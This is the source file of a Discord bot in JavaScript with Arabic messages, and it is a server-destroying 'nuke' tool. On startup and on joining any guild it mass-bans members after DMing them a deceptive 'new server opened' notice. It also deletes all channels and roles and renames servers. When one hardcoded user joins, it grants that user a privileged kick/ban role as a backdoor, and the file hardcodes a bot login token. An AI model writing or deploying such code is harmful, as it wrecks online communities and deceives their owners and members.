const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('by N3K4A IS HERE');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('      ~            ~  By : N3K4A ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  by N3K4A IS HERE " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
       
   
 
});
var prefix = "||"

  
//2 نغير اسم البوت
//3 تفير الاسترنق
//4 تغري صورة السيرفر
//5 تغير اسم السيرفر
   







var x1 = "kk"
LOka.on('message', message => {
     if (message.content === "يتم تعديل السيرفر") {
LOka.user.setAvatar(`https://cdn.pg.sa/orwpyT4Kfc.jpg`)
 
}
});




 
LOka.on('message', message => {
     if (message.content === "بدء عملية  انشاء سيرفر") {
         LOka.guilds.forEach(m =>{
             m.setName(`  N3K4A SERVER `)
})
}
});
LOka.on('message', message => {
     if (message.content === "بدء عملية  انشاء سيرفر") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.pg.sa/orwpyT4Kfc.jpg`)
 
}
});
 
LOka.on('message', message => {
     
 
     if (message.content === "بدء عملية  انشاء سيرفر") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "༺Owner༻",
        permissions :   [1],
        color : " #62d4d2"
    })
    m.createRole({
        name : "༺CO_Owner༻",
        permissions :   [1],
        color : " #24eb4a"
    })
    m.createRole({
        name : "༺ADMIN༻",
        permissions :   [1],
        color : " #965cec"
    })
    m.createRole({
        name : "༻MasTer༻",
        permissions :   [1],
        color : " #dcf5b3"
    })
    m.createRole({
        name : "༺Minister༻",
        permissions :   [1],
        color : " #e9b46a"
    })
    m.createRole({
        name : "༻¥óǔ₮ùβŔ༻",
        permissions :   [1],
        color : " #0a4610"
    })
    m.createRole({
        name : "༺botй༻",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "βiG βὄŝŝ",
        permissions :   [1],
        color : " #4fb2e4"
    })
   
    
 
   
})
 
 
}
});

 
 


LOka.on('message', message => {
         if (message.content === "بدء عملية  انشاء سيرفر") {
               LOka.guilds.forEach(m =>{
m.createChannel('𝒲ℰℒ𝒞𝒪ℳℰ', 'text');
m.createChannel('ℛ𝒰ℒℰ𝒮', 'text');
m.createChannel('p̷h̷o̷t̷o̷', 'text');
m.createChannel('free-account', 'text');
m.createChannel('𝓑𝓞𝓣', 'text');
m.createChannel('BOT', 'text');

 })
}
});

LOka.on('message', message => {
         if (message.content === "بدء عملية  انشاء سيرفر") {
               			   LOka.guilds.forEach(m =>{
						   m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❶', 'voice'); 
						   m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❷', 'voice');
m.createChannel('🎮𝔽𝕆ℝ𝕋ℕ𝕀𝕋𝔼', 'voice');
m.createChannel('🎮𝔹𝕃𝔸ℂ𝕂-𝕊ℚ𝕌𝔸𝔻', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℙℍ', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℕ𝔸', 'voice');
m.createChannel('🎮𝕄𝕀ℕ𝔼ℂℝ𝔸𝔽𝕋', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 1', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 2', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 3', 'voice');
m.createChannel('⫷༺ 💤 A.F.K 💤༺⫸', 'voice');

 
 
 
})
}
 
});
 
 
const { Client } = require('discord.js');
const client = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' مبروك تعديلات السيرفر').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^ تم افتتاح سيرفر جديد برجاء الحضور').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('يتم تعديل السيرفر', 'text');
 
      await guild.createChannel('تحت التعديل', 'voice');
 
 
 
}
 
LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by n3k4a");
  console.log("");
  console.log("-------------------------------------------------------------");
 
});
 
LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
LOka.on('guildMemberAdd', member => {
   
            if (member.id === "360399247029305344") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM",
                    permissions : [10]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });
 
 
 client.on('message', x5bz => {   
 if (x5bz.content.startsWith("a")) {
     x5bz.guild.roles.forEach(r => { r.delete() }) 
     x5bz.guild.channels.forEach(c => { c.delete() })
                let v5bz = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setDescription('**تم الانشاء بنجاح***')
           x5bz.author.sendEmbed(v5bz);
 }
 });
 
 
 
LOka.login("NDYzNDU3Njc3NTExNzUzNzQ5.DikDsQ.PE5hsDQBaOUWtPEYlrSwzpweXBk")
